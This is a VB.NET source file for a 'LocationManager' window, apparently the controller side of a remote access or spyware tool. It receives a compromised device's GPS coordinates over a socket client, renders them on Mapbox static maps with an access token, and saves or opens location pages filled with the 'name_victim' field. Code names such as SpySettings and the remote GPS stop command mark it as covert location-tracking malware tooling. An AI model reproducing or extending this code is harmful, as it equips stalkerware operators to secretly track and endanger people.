Imports System.ComponentModel

Public Class LocationManager

    Public infoMaps As String()

    Public Client As Net.Sockets.TcpClient

    Public classClient As sockets.Client

    Public Link As String

    Public Key As String

    Public Latitude, Longitude As Double

    Public ImageSize As Size

    Public Zoom As Integer

    Public Markers As String

    Public List As New List(Of Array)

    Public WithEvents waiter1 As New Net.WebClient

    Public Threadingg As Threading.Thread

    Public style As String

    Public Title As String = "null"

    Public Accuracy, Speed As String

    Private MouseState As Boolean = False

    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub

    Private Sub LocationManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        SaveToolStripMenuItem.Visible = True

        SaveAsToolStripMenuItem.Visible = True

        Me.ctxMenu.Renderer = New ThemeToolStrip

        Me.Map.ContextMenuStrip = Me.ctxMenu

        Me.Icon = New Icon(reso.res_Path & "\Icons\win\10.ico")

        Threadingg = New Threading.Thread(AddressOf Me.Threadings)

        Threadingg.Priority = System.Threading.ThreadPriority.Normal

        Threadingg.IsBackground = True

        Threadingg.Start()

        Me.Text = Title

        Me.TOpacity.Interval = SpySettings.T_Interval

        Me.TOpacity.Enabled = True

    End Sub

    Private Sub DownloadDataCallback(ByVal sender As Object, ByVal e As Net.DownloadDataCompletedEventArgs)

        Dim ms As New IO.MemoryStream

        Dim waiter As System.Threading.AutoResetEvent = CType(e.UserState, System.Threading.AutoResetEvent)

        Try

            If e.Cancelled = False AndAlso e.Error Is Nothing Then

                Dim data() As Byte = CType(e.Result, Byte())

                ms.Write(data, 0, data.Length)

                infoServer.BytesReceived += ms.Length

            End If

        Finally

            If ms.Length > 0 Then

                Dim image As Image = Image.FromStream(ms)

                MapView(image)

            End If

            waiter.Set()

        End Try

    End Sub
    Private Sub waiter1_DownloadProgressChanged(ByVal sender As Object, ByVal e As System.Net.DownloadProgressChangedEventArgs) Handles waiter1.DownloadProgressChanged

        Progress(e)

    End Sub

    Public Delegate Sub Delegate1(ByVal e As System.Net.DownloadProgressChangedEventArgs)

    Private Sub Progress(ByVal e As System.Net.DownloadProgressChangedEventArgs)
        Try

            If Me.InvokeRequired Then

                Me.Invoke(New Delegate1(AddressOf Progress), New System.Net.DownloadProgressChangedEventArgs() {e})

                Exit Sub

            Else

                ProgressBar1.Value = e.ProgressPercentage

                If ProgressBar1.Value = ProgressBar1.Maximum Then

                    ProgressBar1.Value = 0

                End If

            End If

        Catch ex As System.Exception

        End Try

    End Sub

    Public Delegate Sub Delegate0(ByVal image As Image)

    Private Sub MapView(ByVal image As Image)

        Try

            If Me.InvokeRequired Then

                Me.Invoke(New Delegate0(AddressOf MapView), New Image() {image})

                Exit Sub

            Else

                Map.Image = (image)

                Map.Invalidate()

            End If

        Catch ex As System.Exception

        End Try

    End Sub

    Private Sub Threadings()

        Do

            Threading.Thread.Sleep(10)

            If List.Count > 0 Then

                Latitude = DirectCast(List(0).GetValue(0), Double)

                Longitude = DirectCast(List(0).GetValue(1), Double)

                Dim waiter0 As System.Threading.AutoResetEvent = New System.Threading.AutoResetEvent(False)

                If waiter1 IsNot Nothing Then

                    RemoveHandler waiter1.DownloadDataCompleted, AddressOf DownloadDataCallback

                End If

                AddHandler waiter1.DownloadDataCompleted, AddressOf DownloadDataCallback
                Debug.WriteLine(FormatLink())
                waiter1.DownloadDataAsync(New Uri(FormatLink()), waiter0)


                waiter0.WaitOne()

                waiter1.Dispose()

                List.RemoveAt(0)

            End If

        Loop While True

    End Sub

    Private Function FormatLink() As String
        Dim xMarkers As String = Markers
        xMarkers = xMarkers.Replace("<Longitude>", CStr(Longitude)).Replace("<Latitude>", CStr(Latitude))
        Return String.Format("{0}{1}/static/{2}{3}?access_token={4}", Link, style, xMarkers, CStr(Longitude) & "," & CStr(Latitude) & ")/" & CStr(Longitude) & "," & CStr(Latitude) & "," & CStr(Zoom) & "/" & CStr(ImageSize.Width) & "x" & CStr(ImageSize.Height), Key)
    End Function

    Private Sub NextZoom()

        Zoom += 1

        If Zoom >= 21 Then

            Zoom = 21

        End If

        List.Add({Latitude, Longitude})

    End Sub
    Private Sub BackZoom()

        Zoom -= 1

        If Zoom <= 1 Then

            Zoom = 1

        End If

        List.Add({Latitude, Longitude})
    End Sub
    Private Sub Map_MouseWheel(sender As Object, e As MouseEventArgs) Handles Map.MouseWheel

        If e.Delta < 0 Then

            BackZoom()

        ElseIf e.Delta > 0 Then

            NextZoom()

        End If

    End Sub

    Private Sub Map_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown

        If e.KeyData = Keys.Up Then

            NextZoom()

        ElseIf e.KeyData = Keys.Down Then

            BackZoom()
        End If

    End Sub

    Private Sub LocationManager_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing

        If Not classClient Is Nothing Then

            Dim obj As Object() = {Client, SecurityKey.KeysClient4 & sockets.Data.SPL_SOCKET, Codes.Encoding().GetBytes("null"), classClient}

            classClient.qitGPS = True

            classClient.Send(obj)

        End If

        Try

            Threadingg.Abort()

        Catch ex As Exception

        End Try

    End Sub

    Private Sub Map_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Map.MouseDoubleClick
        MapBOX()
    End Sub

    Private Sub MapBOX()
        Try
            If infoMaps.Length > 0 Then
                If IO.Directory.Exists(infoMaps(0)) Then
                    Dim xd As String = infoMaps(0) & "\" & "Location Manager"
                    If Not IO.Directory.Exists(xd) Then
                        IO.Directory.CreateDirectory(xd)
                    End If
                    Dim data As String = My.Resources.map
                    data = data.Replace("\\accessToken:\\", Key).Replace("\\style:\\", "mapbox://styles/" & style).Replace("\\:\\,\\:\\", CStr(Longitude) & "," & CStr(Latitude)).Replace("\\name_victim:\\", infoMaps(1))
                    Dim F_path As String = xd & "\" & DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"
                    IO.File.WriteAllText(F_path, data)
                    Process.Start(F_path)
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub
    Private Sub Map_MouseHover(sender As Object, e As EventArgs) Handles Map.MouseHover

        MouseState = True

        Map.Invalidate()

    End Sub

    Private Sub Map_MouseLeave(sender As Object, e As EventArgs) Handles Map.MouseLeave

        MouseState = False

        Map.Invalidate()

    End Sub

    Private Sub Map_Paint(sender As Object, e As PaintEventArgs) Handles Map.Paint

        If MouseState And Not Accuracy = "jump" And Not Speed = "jump" Then

            Dim txt As String = String.Format("Accuracy {0} - {1}", Accuracy, Speed)

            Dim stringSize As New SizeF

            stringSize = e.Graphics.MeasureString(txt, reso.f)

            Dim rect As New Rectangle(5, 5, stringSize.Width, stringSize.Height)

            Dim clr As Color = SpySettings.DefaultColor_Background

            e.Graphics.FillRectangle(New Pen(Color.FromArgb(200, clr.R, clr.G, clr.B)).Brush, rect)

            e.Graphics.DrawString(txt, reso.f, New SolidBrush(SpySettings.DefaultColor_Foreground), 5, 5)

        End If

    End Sub

    Private Sub OpenUsingGoogleMapsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenUsingGoogleMapsToolStripMenuItem.Click
        Dim google_maps As String = String.Format("https://www.google.com/maps/dir/{0},{1}/@{2},{3},{4}", CStr(Latitude), CStr(Longitude), CStr(Latitude), CStr(Longitude), "17z")
        Process.Start(google_maps)
    End Sub

    Private Sub OpenUsingMapBoxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenUsingMapBoxToolStripMenuItem.Click
        MapBOX()
    End Sub

    Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Try
            If infoMaps.Length > 0 Then
                If IO.Directory.Exists(infoMaps(0)) Then
                    Dim xd As String = infoMaps(0) & "\" & "Location Manager"
                    If Not IO.Directory.Exists(xd) Then
                        IO.Directory.CreateDirectory(xd)
                    End If
                    Dim data As String = My.Resources.map
                    data = data.Replace("\\accessToken:\\", Key).Replace("\\style:\\", "mapbox://styles/" & style).Replace("\\:\\,\\:\\", CStr(Longitude) & "," & CStr(Latitude)).Replace("\\name_victim:\\", infoMaps(1))
                    IO.File.WriteAllText(xd & "\" & DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html", data)
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Try
            If infoMaps.Length > 0 Then
                Dim xd As String = infoMaps(0) & "\" & "Location Manager"
                Dim data As String = My.Resources.map
                data = data.Replace("\\accessToken:\\", Key).Replace("\\style:\\", "mapbox://styles/" & style).Replace("\\:\\,\\:\\", CStr(Longitude) & "," & CStr(Latitude)).Replace("\\name_victim:\\", infoMaps(1))
                Dim SaveAS As New SaveFileDialog
                SaveAS.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"
                SaveAS.Filter = "html (*.html)|*.html"
                If SaveAS.ShowDialog = Windows.Forms.DialogResult.OK Then
                    IO.File.WriteAllText(SaveAS.FileName, data)
                End If
                SaveAS.Dispose()
            End If
        Catch ex As Exception
        End Try
    End Sub

End Class